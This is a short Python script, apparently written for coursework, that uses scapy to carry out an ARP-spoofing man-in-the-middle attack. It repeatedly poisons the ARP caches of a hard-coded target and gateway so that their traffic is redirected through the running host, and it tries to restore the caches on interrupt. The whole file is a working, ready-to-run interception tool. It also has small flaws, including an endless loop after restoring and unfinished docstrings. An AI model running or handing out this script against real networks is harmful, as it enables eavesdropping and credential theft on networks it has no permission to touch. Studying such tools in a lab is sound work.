#!/usr/bin/env python3
"""
file:       arp_spoof.py
author:     Chris Tremblay <cst1465@rit.edu>
languate:   Python3
date:       2/13/2023, National Clean Out Your Computer Day
description:
    a suite to arp poison a switch to redirect traffic to this host
    check https://www.geeksforgeeks.org/python-how-to-create-an-arp-spoofer-using-scapy/
    for code
"""

import scapy.all as scapy
import time

# constants
TARGET  = "192.168.1.34"
GATEWAY = "192.168.1.1"
VERBOSE = False

def get_mac( ip: str ) -> str:
    """
    description:
        get the MAC address for a given ip
    parameter:
        ip -> the ip address we want to get the mac address of
    return:
        the MAC address in string format
    """
    # create arp request with dst ip
    arp_req = scapy.ARP( pdst=ip )
    bcast = scapy.Ether( dst="ff:ff:ff:ff:ff:ff" )
    arp_req_bcast = bcast / arp_req
    answer = scapy.srp( arp_req_bcast, timeout=5, verbose=VERBOSE )[0]
    return answer[0][1].hwsrc 

def spoof( target_ip: str, spoof_ip: str ):
    """
    description:
        craft an arp packet and send it to spoof the 
    parameters:
        target_ip -> the 
    """
    packet = scapy.ARP( op=2, \
                        pdst=target_ip, hwdst=get_mac(target_ip), \
                        psrc = spoof_ip )
    scapy.send( packet, verbose=VERBOSE )
    return

def restore( dst_ip: str, src_ip:str ):
    """
    description:
        restore back to defaults
    parameters:
        dst_ip -> the ip to go in dst field of ARP packet
        src_ip -> the ip to go in src field of ARP packet
    """
    # get mac addresses
    dst_mac = get_mac( dst_ip )
    src_mac = get_mac( src_ip )

    # craft packet    
    packet = scapy.ARP( op=2, \
                pdst=dst_ip, hwdst=dst_mac, \
                psrc=src_ip, hwsrc=src_mac )
    
    # send
    scapy.send( packet, verbose=VERBOSE )

def main():
    """
    description:
        the driver function
    """
    # start spoofing
    packets_sent = 0
    while( True ):
        try:
            spoof( TARGET, GATEWAY )
            spoof( GATEWAY, TARGET )
            packets_sent += 2
            time.sleep( 1 )
            print( "packets sent %d" % packets_sent )
        except KeyboardInterrupt:
            print( "done" )
            restore( TARGET, GATEWAY )
            restore( GATEWAY, TARGET )
    return

if( __name__ == "__main__" ):
    main()
